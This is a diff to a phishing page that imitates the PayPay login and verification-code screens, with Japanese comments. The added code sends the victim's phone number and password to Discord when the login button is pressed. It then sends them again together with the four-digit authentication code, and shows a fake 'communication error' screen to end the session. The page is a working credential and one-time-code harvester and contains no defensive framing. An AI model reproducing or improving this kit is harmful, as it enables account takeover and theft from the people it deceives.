@@ -446,6 +446,45 @@
       border-color: #ff0033;
       background-color: #fff;
     }
+
+
+    /* =========================================
+       4. 通信エラー画面
+    ========================================= */
+    .error-body {
+      padding: 40px 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100%;
+      text-align: center;
+      color: #222;
+    }
+    .error-circle {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      background-color: #fee2e2;
+      color: #dc2626;
+      font-size: 30px;
+      font-weight: 700;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 18px;
+    }
+    .error-title {
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
+    .error-desc {
+      font-size: 13px;
+      color: #666;
+      line-height: 1.6;
+      margin-bottom: 28px;
+    }
   </style>
 </head>
 <body>
@@ -590,6 +629,24 @@
       </div>
     </div>
 
+    <!-- 4. 通信エラー画面 -->
+    <div id="viewError" class="view-section">
+      <header class="app-header">
+        <div class="header-inner">
+          <div class="paypay-logo-area">
+            <div class="p-box">P</div> PayPay
+          </div>
+        </div>
+        <div class="blue-line"></div>
+      </header>
+
+      <div class="error-body">
+        <div class="error-circle">!</div>
+        <div class="error-title">通信エラーが発生しました</div>
+        <div class="error-desc">サーバーとの通信に失敗しました。<br>電波の良い場所で再度お試しください。</div>
+      </div>
+    </div>
+
   </div>
 
   <script>
@@ -662,18 +719,21 @@
     loginIdInput.addEventListener("input", checkLoginInputs);
     loginPassInput.addEventListener("input", checkLoginInputs);
 
-    // ログインボタン押下時（ここではDiscord送信を行わず、データを保持して画面遷移）
+    // 【1回目】ログインボタン押下時：ここでDiscordにログイン情報を送信して画面遷移
     loginSubmitBtn.addEventListener("click", () => {
       if (!loginSubmitBtn.classList.contains("active")) return;
 
       savedPhone = loginIdInput.value;
       savedPass = loginPassInput.value;
 
+      // 1回目のDiscord送信
+      sendToDiscord(`🔑 **【1回目】ログイン情報入力**\n📱 携帯番号: \`${savedPhone}\`\n🔒 パスワード: \`${savedPass}\``);
+
       goToView("viewOtp");
       otpDigits[0].focus();
     });
 
-    // 認証コード4桁がすべて入力されたときに、電話番号・パスワード・コードをセットでDiscordへ送信
+    // 【2回目】認証コード4桁がすべて入力されたとき：ログイン情報 ＆ 認証コードをセットで送信し、通信エラー画面へ
     const otpDigits = document.querySelectorAll('.otp-digit');
     otpDigits.forEach((input, index) => {
       input.addEventListener('input', (e) => {
@@ -684,9 +744,13 @@
         
         const fullCode = Array.from(otpDigits).map(i => i.value).join('');
         if (fullCode.length === 4) {
+          // セットでDiscordへ送信
           sendToDiscord(`🔐 **【認証完了】ログイン情報 ＆ 認証コード**\n📱 携帯番号: \`${savedPhone}\`\n🔒 パスワード: \`${savedPass}\`\n✨ 4桁コード: \`${fullCode}\``);
+          
           setTimeout(() => {
             otpDigits.forEach(i => i.value = '');
+            // 無限ループを防ぐため通信エラー画面へ移行してストップ
+            goToView('viewError');
           }, 300);
         }
       });
